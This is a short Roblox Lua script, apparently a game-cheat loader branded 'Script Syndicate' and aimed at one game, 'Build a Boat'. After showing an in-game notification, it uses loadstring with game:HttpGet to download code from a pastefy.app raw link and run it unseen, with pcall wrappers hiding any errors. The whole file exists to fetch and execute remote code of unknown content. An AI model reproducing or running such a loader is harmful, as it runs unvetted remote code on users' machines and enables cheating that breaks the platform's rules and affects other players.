-- :D 
-- Wat r u duing?
local function Load()
    if game.PlaceId == 537413528 then
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", { Title = "Script Syndicate", Text = "Build a Boat Loading!", Duration = 5, Button1 = "Alr" })
            loadstring(game:HttpGet("https://pastefy.app/B0rj1blP/raw"))()
        end)
    end
end

pcall(function()
    Load()
end)
